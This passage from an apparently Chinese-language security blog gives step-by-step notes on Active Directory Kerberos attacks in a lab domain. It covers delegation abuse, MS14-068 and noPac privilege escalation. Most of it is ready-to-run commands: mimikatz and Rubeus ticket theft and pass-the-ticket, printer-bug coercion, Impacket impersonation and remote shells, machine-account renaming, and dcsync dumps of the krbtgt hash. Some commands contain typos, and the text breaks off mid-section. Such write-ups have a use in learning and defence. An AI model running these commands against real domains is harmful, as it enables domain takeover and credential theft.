class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> | <span class="hljs-keyword">grep</span> -e dn -e msDS-AllowedToDelegateTo<br></code></pre></td></tr></table></figure>







<h4 id="查询基于资源的约束性委派的主机或服务账户"><a href="#查询基于资源的约束性委派的主机或服务账户" class="headerlink" title="查询基于资源的约束性委派的主机或服务账户"></a>查询基于资源的约束性委派的主机或服务账户</h4><p>Adfind</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment">#查询基于资源的约束性委派的主机</span><br>Adfind.exe -<span class="hljs-keyword">b </span><span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))&quot;</span> msDS-AllowedToActOnBehalfOfOtherIdentity<br><br><span class="hljs-comment">#查询基于资源的约束性委派的服务账户</span><br>Adfind.exe -<span class="hljs-keyword">b </span><span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))&quot;</span> msDS-AllowedToActOnBehalfOfOtherIdentity<br></code></pre></td></tr></table></figure>





<p>Ldapsearch</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#查询基于资源的约束性委派的主机</span><br>ldapsearch -<span class="hljs-keyword">x</span> -H ldap:<span class="hljs-regexp">//</span>域控IP:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;tony@sayms.local&quot;</span> -w admin123$% -b <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))&quot;</span> | <span class="hljs-keyword">grep</span> dn<br><br><span class="hljs-comment">#查询基于资源的约束性委派的服务账户</span><br>ldapsearch -<span class="hljs-keyword">x</span> -H ldap:<span class="hljs-regexp">//</span>域控IP:<span class="hljs-number">389</span> -D <span class="hljs-string">&quot;tony@sayms.local&quot;</span> -w admin123$% -b <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))&quot;</span> | <span class="hljs-keyword">grep</span> dn<br></code></pre></td></tr></table></figure>





<h4 id="查询某个账户是否具有委派性"><a href="#查询某个账户是否具有委派性" class="headerlink" title="查询某个账户是否具有委派性"></a>查询某个账户是否具有委派性</h4><p>通过查看服务账户和机器账户的属性，来判断是否具有委派性</p>
<p>账户没有委派性，<strong>只有</strong>userAccountControl有值</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment">#服务账户的值</span><br><span class="hljs-keyword">NORMAL_ACCOUNT</span><br><span class="hljs-keyword"></span><br><span class="hljs-comment">#机器账户的值</span><br>WORKSTATION_TRUST_ACCOUNT<br></code></pre></td></tr></table></figure>







<h3 id="委派攻击操作"><a href="#委派攻击操作" class="headerlink" title="委派攻击操作"></a>委派攻击操作</h3><p>委派攻击攻击发生在TGS_REQ、TGS_REP</p>
<h4 id="非约束性委派攻击"><a href="#非约束性委派攻击" class="headerlink" title="非约束性委派攻击"></a>非约束性委派攻击</h4><p>思路就是诱骗域管理员来访问服务，从而获得TGT票据</p>
<p><strong>诱骗域管访问服务</strong></p>
<p>首先先设置win7具有允许委派属性</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230219090956104.png"  ><span class="image-caption">image-20230219090956104</span></p>
<p>然后使用域管账户远程ipc连接win7</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\win7.sayms.<span class="hljs-keyword">local</span> <span class="hljs-string">&quot;admin123$%&quot;</span> /user:<span class="hljs-string">&quot;sayms\tony&quot;</span><br></code></pre></td></tr></table></figure>

<p>连接之后会产生TGT票据</p>
<p>在win7上，使用mimikatz获取内存的票据</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp">privilege::debug<br><br>sekurlsa::tickers /<span class="hljs-keyword">export</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230219104414101.png"  ><span class="image-caption">image-20230219104414101</span></p>
<p>将票据导入内存</p>
<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">kerberos::ptt [<span class="hljs-number">0</span>;ade48]-<span class="hljs-number">2</span>-<span class="hljs-number">0</span>-<span class="hljs-number">60810000</span>-tony<span class="hljs-keyword">@krbtgt-SAYMS</span>.LOCAL.kirbi<br><br><span class="hljs-attribute">kerberos</span>::list<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230219104646584.png"  ><span class="image-caption">image-20230219104646584</span></p>
<p>尝试访问域控</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230219104752336.png"  ><span class="image-caption">image-20230219104752336</span></p>
<p>成功，在没有票据之前，是无法通过ipc远程访问域控的</p>
<p>但是此方法是比较鸡肋的，需要域管主动来访问服务，主动权在域管手中</p>
<p><strong>结合在打印机漏洞攻击</strong></p>
<p>可以利用打印机服务漏洞，来强制域控连接配置了非约束性委派的主机</p>
<p>首先配置监听</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#每隔一秒监听一次来自DC域控的票据</span><br>rubeus.exe<span class="hljs-built_in"> monitor </span>/interval:1 /filteruser:DC$<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230219112648694.png"  ><span class="image-caption">image-20230219112648694</span></p>
<p>然后在win7上使用打印机服务漏洞攻击域控DC，使域控强制回连认证</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">SpoolSample.exe DC wi<span class="hljs-symbol">n7</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230308111007728.png"  ><span class="image-caption">image-20230308111007728</span></p>
<p>看到rebeus收到来自域控的票据</p>
<p>票据里面是有换行符的，需要去掉</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">data=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>):<br>    data += line.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;2.txt&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;保存完毕&#x27;</span>)<br></code></pre></td></tr></table></figure>



<p>然后直接使用rubeus导入该票据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">rubeus.exe ptt /ticket:<span class="hljs-built_in">base64</span>的票据<br></code></pre></td></tr></table></figure>

<p>然后就可以进行高权限操作了</p>
<p><strong>域控的机器账户不能用于登陆，但是可以导出hash</strong></p>
<h4 id="约束性委派的攻击"><a href="#约束性委派的攻击" class="headerlink" title="约束性委派的攻击"></a>约束性委派的攻击</h4><p><strong>环境配置</strong></p>
<p>首先设置账户aim进行约束性委派</p>
<p>将aim注册为SPN服务账户</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">setspn -S cifs/DC<span class="hljs-selector-class">.sayms</span><span class="hljs-selector-class">.local</span> aim<br></code></pre></td></tr></table></figure>

<p>然后设置约束性委派</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230219121231228.png"  ><span class="image-caption">image-20230219121231228</span></p>
<p><strong>攻击流程</strong></p>
<p>首先我们拿到了win7的权限，是以aim账户登陆的</p>
<p>抓取密码为admin@123</p>
<p>查询是否存在约束性委派服务账户</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">Adfind<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">b</span> <span class="hljs-string">&quot;DC=sayms,DC=local&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> msds-allowedtodelegateto<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230219121926879.png"  ><span class="image-caption">image-20230219121926879</span></p>
<p>发现存在CIFS服务的账户aim，然后就可以使用Impacket包攻击</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#以域管tony身份申请一张访问cifs服务的票据</span><br>python3 getST.py -dc-ip 域控ip sayms.<span class="hljs-keyword">local</span>/aim:admin<span class="hljs-symbol">@123</span> -spn cifs/DC.sayms.<span class="hljs-keyword">local</span> -impersonate tony<br><br><span class="hljs-meta">#导入票据</span><br>export KRB5CCNAME=tony.ccache<br><br><span class="hljs-meta">#远程访问域控</span><br>python3 smbexec.py -no-pass -k DC.sayms.<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure>









<h4 id="基于受限资源的委派攻击"><a href="#基于受限资源的委派攻击" class="headerlink" title="基于受限资源的委派攻击"></a>基于受限资源的委派攻击</h4><p>我们拿到域内主机win2008的权限，且当前登陆为tom，而tom就是把win2008加入域的用户</p>
<p>因为win2008不在管理员组中，所以基本不可能进行mimikatz导出hash的操作</p>
<p>因为win2008是tom加入的，所以tom有给win2008基于资源的约束性委派的权限</p>
<p>首先新建机器账户test$，配置test$到win2008的基于资源的委派</p>
<p>然后执行如下命令，就可以提权到win2008的system权限</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">#用administrator申请一个访问cifs/win2008的服务票据<br>python3 getST<span class="hljs-selector-class">.py</span> -dc-ip DC<span class="hljs-selector-class">.sayms</span><span class="hljs-selector-class">.local</span> sayms.local/test$<span class="hljs-selector-pseudo">:root</span> -spn cifs/win2008<span class="hljs-selector-class">.sayms</span><span class="hljs-selector-class">.local</span> -impersonate administrator<br><br>#导入票据<br>export KRB5CCNAME=administrator<span class="hljs-selector-class">.ccache</span><br><br>#远程访问win2008<br>python3 smbexec<span class="hljs-selector-class">.py</span> -no-pass -k win2008<span class="hljs-selector-class">.xie</span>.com<br></code></pre></td></tr></table></figure>







<h1 id="PAC攻击"><a href="#PAC攻击" class="headerlink" title="PAC攻击"></a>PAC攻击</h1><p>pac方面的攻击主要是几个著名的漏洞</p>
<h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>权限提升漏洞</p>
<h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p><font color='red'>密钥层面</font></p>
<p>PAC包含两个数字签名PAC_SERVER_CHECKSUM、PAC_PRIVSVR_CHECKSUM</p>
<p>这两个数字签名分别是服务的hash和krbtgt的hash加密的，使用checksum算法</p>
<p>但是使用该系列算法，是允许使用该系列的所有算法的，那么我们可以选用MD5算法</p>
<p>MD5算法是不需要密钥进行加密的，所以也就不需要服务和krbtgt的hash值</p>
<p><font color='red'>PAC放置问题</font></p>
<p>既然是伪造PAC，那么开始我们的TGT就不能产生PAC</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">客户端通过AS_REQ报文中设置PA-<span class="hljs-keyword">PAC</span>-REQUEST-PA-DATA为false<br>从而使<span class="hljs-keyword">AS</span>返回的TGT票据不包含<span class="hljs-keyword">PAC</span><br></code></pre></td></tr></table></figure>

<p>PAC伪造之后，TGT是krbtgt加密的，无法将伪造的PAC插入</p>
<p>接着考虑TGS_REQ数据包</p>
<p>TGS_REQ数据包包含TGT票据、认证因子</p>
<p>TGT票据是不行的，但是认证因子可以</p>
<p>这就为伪造PAC，创造了两个条件</p>
<p>就可以伪造高权限PAC去访问任何服务</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>域控：win2016    192.168.8.1</p>
<p>域内主机：win10    192.168.8.3</p>
<p>普通域用户    aim：admin@123</p>
<p>目前拿到win7的权限，是以aim登陆的，尝试提权到system</p>
<p>查看aim的SID</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230220233515201.png"  ><span class="image-caption">image-20230220233515201</span></p>
<p>利用MS14-068工具，生成票据</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MS14</span>-<span class="hljs-number">068</span>.exe -u aim@sayms.local -p admin@<span class="hljs-number">123</span> -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1800720312</span>-<span class="hljs-number">2905234279</span>-<span class="hljs-number">4070812641</span>-<span class="hljs-number">1105</span> -d <span class="hljs-number">192.168.8.1</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230220234130475.png"  ><span class="image-caption">image-20230220234130475</span></p>
<p>mimikatz导入票据</p>
<figure class="highlight moonscript"><table><tr><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">kerberos</span>::purge<br><br><span class="hljs-name">kerberos</span>::ptc <span class="hljs-name">C</span>:\Users\tom\Desktop\MS14<span class="hljs-number">-068</span>-master\TGT_tom@sayms.<span class="hljs-keyword">local</span>.ccache<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230220234354895.png"  ><span class="image-caption">image-20230220234354895</span></p>
<p>尝试连接域控</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\DC.sayms.local\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230220234757712.png"  ><span class="image-caption">image-20230220234757712</span></p>
<p>失败，应该是因为域控为win2016，已经更新该漏洞</p>
<h2 id="NoPAC"><a href="#NoPAC" class="headerlink" title="NoPAC"></a>NoPAC</h2><p>两个漏洞结合，可以实现权限提升</p>
<p>CVE-2021-42278、CVE-2021-42287</p>
<h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p><font color='red'>kerberos在处理username时，首先去找username，找不到就会去找username$，假如还找不到，就会去找altSecurityIdentities属性值对应的用户</font></p>
<p>其次是让KDC找不到原账户</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">跨域请求时，目标域找不到该域用户，所以会按照上面来找username<br><br>修改saMAccountName属性，修改该属性让KDC找不到用户，然后就来找username<br></code></pre></td></tr></table></figure>



<p>PAC机制</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">AS</span>可以和用户协商，返回的TGT中不包含<span class="hljs-keyword">PAC</span><br><br><span class="hljs-keyword">ST</span>中的<span class="hljs-keyword">PAC</span>是复制TGT的，TGT中无<span class="hljs-keyword">PAC</span>，在正常情况下<span class="hljs-keyword">ST</span>中也是无<span class="hljs-keyword">PAC</span>的<br></code></pre></td></tr></table></figure>



<p>最后就是考虑伪造PAC，而<font color='red'>TGT中的PAC是预身份认证生成的，无法伪造</font>，就只能考虑ST中的PAC</p>
<p>ST中的PAC是直接复制TGT的PAC，所以首先应该考虑不然ST复制TGT中的PAC</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">KDC在跨域的TGS_REQ中，如果TGT无<span class="hljs-keyword">PAC</span>，会重新生成<br><br>KDC在处理S4u2Self的TGS_REQ时，<span class="hljs-keyword">PAC</span>是重新生成的<br></code></pre></td></tr></table></figure>





<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>首先用原有用户生成机器账户server$</p>
<p>修改机器账户server$的saMAccountName属性中的altSecurityIdentities的值为域控机器名字DC</p>
<p>然后用DC账户请求TGT</p>
<p>修改机器账户的saMAccountName属性的altSecurityIdentities的值为server$，即还原</p>
<p>然后用域管账户以S4u2Self协议，带上TGT来申请域控的服务</p>
<p>此时，KDC会查找DC这个账户，因为修改了saMAccountName属性，找不到DC账户，接着寻找DC$，此时找到了域控</p>
<p>然后就会以域控身份发起S4u2Self协议来访问自身的服务，此时就会返回域管的ST</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">需要注意的是，在域中，机器账户可以利用S4u2Self协议，来模拟任意用户来访问自身的SPN<br></code></pre></td></tr></table></figure>





<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>根据上面思路</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><code class="hljs avrasm">创建机器账户<br><br>修改机器账户的saMAccountName属性<br><br>用修改之后的属性，请求TGT<br><br>复原机器账户的属性<br><br>以S4u2Self协议，发起请求<span class="hljs-keyword">ST</span><br><br>提权成功<br></code></pre></td></tr></table></figure>



<h4 id="创建机器账户"><a href="#创建机器账户" class="headerlink" title="创建机器账户"></a>创建机器账户</h4><p>普通域内用户默认最多创建10个机器账户</p>
<p>普通域内账户的ms-DS-MachineAccountQuota属性来决定，默认该属性的值为10</p>
<p><strong>python脚本创建</strong></p>
<p>利用SAMR协议远程创建机器账户</p>
<p>创建的账户是没有SPN的</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><code class="hljs oxygene">python3 addcomputer.py -computer-name <span class="hljs-string">&#x27;server&#x27;</span> -computer-pass <span class="hljs-string">&#x27;root&#x27;</span> -dc-ip 域控ip <span class="hljs-string">&#x27;sayms,local/tom:admin@12345&#x27;</span> -<span class="hljs-keyword">method</span> <span class="hljs-title function_">SARM</span> -<span class="hljs-title function_">debug</span><br></code></pre></td></tr></table></figure>



<p><strong>powershell脚本创建</strong></p>
<p>创建的账户是有SPN的</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Import</span>-Module .\<span class="hljs-built_in">New</span>-MachineAccount.ps1<br><span class="hljs-built_in">New</span>-MachineAccount -MachineAccount <span class="hljs-keyword">server</span> -<span class="hljs-keyword">Password</span> root<br></code></pre></td></tr></table></figure>

<p>那么就需要清除掉</p>
<p>在创建的机器账户server$上执行命令去除</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">powerview</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><br><span class="hljs-built_in">Set</span><span class="hljs-operator">-</span><span class="hljs-variable">DomainObject</span> <span class="hljs-string">&quot;CN=server,CN=Computers,DC=sayms,DC=local&quot;</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Clear</span> <span class="hljs-operator">&#x27;</span><span class="hljs-variable">serviceprincipalname</span><span class="hljs-operator">&#x27;</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Verbose</span><br></code></pre></td></tr></table></figure>

<p>远程去除，需要提供一个拥有去除SPN权限的用户</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">python3 addspn<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&#x27;sayms.local\tom&#x27;</span> -<span class="hljs-selector-tag">p</span> admin@<span class="hljs-number">12345</span> -t <span class="hljs-string">&#x27;server$&#x27;</span> -<span class="hljs-selector-tag">p</span> 域控ip<br></code></pre></td></tr></table></figure>





<h4 id="修改saMAcconutName属性"><a href="#修改saMAcconutName属性" class="headerlink" title="修改saMAcconutName属性"></a>修改saMAcconutName属性</h4><p>在创建server$的主机上面修改</p>
<p><strong>powershell</strong></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Import</span>-Module .\Powermad.ps1<br><br>#查询<br><span class="hljs-keyword">Get</span>-MachineAccountAttribute -MachineAccount <span class="hljs-keyword">server</span> -<span class="hljs-keyword">Attribute</span> saMAccountName<br><br>#修改<br><span class="hljs-keyword">Set</span>-MachineAccountAttribute -MachineAccount <span class="hljs-keyword">server</span> -<span class="hljs-keyword">Value</span> &quot;DC&quot; -<span class="hljs-keyword">Attribute</span> saMAccountName -<span class="hljs-keyword">Verbose</span><br></code></pre></td></tr></table></figure>



<p><strong>python脚本</strong></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">python3 renameMachine.py -<span class="hljs-keyword">current</span>-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;server$&#x27;</span> -<span class="hljs-built_in">new</span>-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;DC&#x27;</span> -dc-ip DC.sayms.<span class="hljs-keyword">local</span> sayms.<span class="hljs-keyword">local</span>/tom:<span class="hljs-keyword">admin</span>@<span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure>





<h4 id="请求TGT"><a href="#请求TGT" class="headerlink" title="请求TGT"></a>请求TGT</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">rubeus.exe asktgt /user:<span class="hljs-string">&quot;DC&quot;</span> /password:<span class="hljs-string">&quot;root&quot;</span> /domain:<span class="hljs-string">&quot;sayms.local&quot;</span> /dc:<span class="hljs-string">&quot;DC.sayms.local&quot;</span> /nowrap /ptt<br></code></pre></td></tr></table></figure>







<h4 id="复原saMAcconutName属性"><a href="#复原saMAcconutName属性" class="headerlink" title="复原saMAcconutName属性"></a>复原saMAcconutName属性</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Import</span>-Module .\Powermad.ps1<br><br>#查询<br><span class="hljs-keyword">Get</span>-MachineAccountAttribute -MachineAccount <span class="hljs-keyword">server</span> -<span class="hljs-keyword">Attribute</span> saMAccountName<br><br>#修改<br><span class="hljs-keyword">Set</span>-MachineAccountAttribute -MachineAccount <span class="hljs-keyword">server</span> -<span class="hljs-keyword">Value</span> &quot;server&quot; -<span class="hljs-keyword">Attribute</span> saMAccountName -<span class="hljs-keyword">Verbose</span><br></code></pre></td></tr></table></figure>







<p><strong>请求ST</strong></p>
<p>用S4u2Self协议以administrator身份请求ldap/DC.sayms.local服务的ST</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Rubeus.exe s4u /self /impersonateuser:<span class="hljs-string">&quot;administator&quot;</span> /altservice:<span class="hljs-string">&quot;ldap/DC.sayms.local&quot;</span> /dc:<span class="hljs-string">&quot;DC.sayms.local&quot;</span> /ptt /ticket:上面的TGT,<span class="hljs-built_in">base64</span>格式<br></code></pre></td></tr></table></figure>





<h4 id="验证是否有高权限"><a href="#验证是否有高权限" class="headerlink" title="验证是否有高权限"></a>验证是否有高权限</h4><p>导出krbtgt的hash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:sayms.local /user:krbtgt /csv<br></code></pre></td></tr></table></figure>







<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>可以看到，这个漏洞的利用，不管是原理还是操作，都是有些复杂的</p>
<p>但是有比较方便的工具</p>
<h4 id="nopac-exe"><a href="#nopac-exe" class="headerlink" title="nopac.exe"></a>nopac.exe</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">nopac.exe -<span class="hljs-keyword">domain</span> sayms.<span class="hljs-keyword">local</span> -<span class="hljs-keyword">user</span> tom -pass <span class="hljs-keyword">admin</span>@<span class="hljs-number">12345</span> /dc DC.sayms.<span class="hljs-keyword">local</span> /mAccount <span class="hljs-keyword">server</span> /mPassword root /service cifs /ptt<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230222232825297.png"  ><span class="image-caption">image-20230222232825297</span></p>
<p>然后就可以使用mimikatz直接导出任意用户的hash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">kerberos::list<br><br>lsadump::dcsync /domain:sayms.local /user:krbtgt /csv<br></code></pre></td></tr></table></figure>





<h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">#创建机器用户<br>python3 addcomputer.py -computer-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;server&#x27;</span> -computer-pass <span class="hljs-string">&#x27;root&#x27;</span> -dc-ip <span class="hljs-number">192.168</span><span class="hljs-number">.8</span><span class="hljs-number">.1</span> <span class="hljs-string">&#x27;sayms.local/tom:admin@12345&#x27;</span> -<span class="hljs-keyword">method</span> SAMR<br><br><br>#修改机器用户的saMAcconutName属性为DC<br>python3 renameMachine.py -<span class="hljs-keyword">current</span>-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;server$&#x27;</span> -<span class="hljs-built_in">new</span>-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;DC&#x27;</span> -dc-ip <span class="hljs-number">192.168</span><span class="hljs-number">.8</span><span class="hljs-number">.1</span> sayms.<span class="hljs-keyword">local</span>/tom:<span class="hljs-keyword">admin</span>@<span class="hljs-number">12345</span><br><br><br>#以<span class="hljs-keyword">server</span>$的身份去请求TGT，用户名为DC<br>python3 getTGT.py -dc-ip <span class="hljs-number">192.168</span><span class="hljs-number">.8</span><span class="hljs-number">.1</span> sayms/DC:root<br><br><br>#导入TGT<br>export KRB5CCNAME=DC.ccache<br><br><br>#恢复saMAcconutName属性<br>python3 renameMachine.py -<span class="hljs-keyword">current</span>-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;DC&#x27;</span> -<span class="hljs-built_in">new</span>-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;server$&#x27;</span> -dc-ip DC.sayms.<span class="hljs-keyword">local</span> sayms.<span class="hljs-keyword">local</span>/tom:<span class="hljs-keyword">admin</span>@<span class="hljs-number">12345</span><br><br><br>#以S4u2Self协议，用administrator身份去请求域控DC.sayms.<span class="hljs-keyword">local</span>的服务<br>python3 getST.py -spn cifs/DC.sayms,<span class="hljs-keyword">local</span> sayms/DC@域控ip -<span class="hljs-keyword">no</span>-pass -k -dc-ip 域控ip -impersonate administrator -self<br><br><br><br>#导入ST<br>export KRB5CCNAME=administrator.ccache<br><br><br><br>#验证，导出krbtgt的hash<br>python3 secretsdump.py DC.sayms.<span class="hljs-keyword">local</span> -k -<span class="hljs-keyword">no</span>-pass -just-dc-<span class="hljs-keyword">user</span> krbtgt<br></code></pre></td></tr></table></figure>





<h4 id="sam-the-admin"><a href="#sam-the-admin" class="headerlink" title="sam_the_admin"></a>sam_the_admin</h4><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#获取权限</span><br>python3 sam_the_admin.py <span class="hljs-string">&quot;sayms/tom:admin@12345&quot;</span> -dc-ip 域控ip -shell<br><br><br><span class="hljs-comment">#导出hash</span><br>python3 sam_the_admin.py <span class="hljs-string">&quot;sayms/tom:admin@12345&quot;</span> -dc-ip 域控ip -<span class="hljs-keyword">dump</span><br></code></pre></td></tr></table></figure>

<p><font color='red'>相比较来说，sam_the_admin最容易实现</font></p>
<h3 id="MAQ为0的攻击"><a href="#MAQ为0的攻击" class="headerlink" title="MAQ为0的攻击"></a>MAQ为0的攻击</h3><p>MAQ是普通域内用户账户能够添加机器账户的数量，默认为10，如果设置为0，我们就无法按照上面的方法进行nopac攻击</p>
<p>此时就考虑到用域内已经存在的机器账户，拿来利用</p>
<p>对于修改saMAccountName属性，发现只有域管和将主机加入域的用户，才能对该属性进行修改</p>
<p>然后下面的利用就分为两种情况</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">获得了域内已经存在的机器权限<br><br>获取了将机器加入域的用户权限<br></code></pre></td></tr></table></figure>



<p><strong>如果获得了域内已经存在的机器权限</strong></p>
<p>如果我们获取了域内一台主机的最高权限，<strong>假设是WIN7</strong></p>
<p>首先找，是谁将该主机加入的域</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">先查取该机器的mS-<span class="hljs-keyword">DS</span>-CreatorSID属性，找到SID<br>然后用该SID，找到对应用户，即将该主机加入域的用户<br><br>#查取mS-<span class="hljs-keyword">DS</span>-CreatorSID属性<br>AdFind.exe -f <span class="hljs-string">&quot;&amp;(objectcategory=computer)(name=win10)&quot;</span> mS-<span class="hljs-keyword">DS</span>-CreatorSID<br><br>#找到SID对应的用户<br>AdFind.exe -<span class="hljs-keyword">sc</span> adsid:刚才查询的SID值 -dn<br></code></pre></td></tr></table></figure>



<p>假如通过上面的发现，是tom将主机加入的域</p>
<p>想要接着后续利用，就想要知道tom的密码</p>
<p>先查询WIN7$的SPN，需要WIN7的hash值，因为前提是我们已经拿到了WIN7的权限，所以直接用mimikatz导出hash</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">python3 addspn<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&#x27;xie.com\WIN7$&#x27;</span> -P 哈希值 -t <span class="hljs-string">&#x27;win10$&#x27;</span> -<span class="hljs-selector-tag">q</span> 域控ip<br></code></pre></td></tr></table></figure>



<p>然后删除SPN</p>
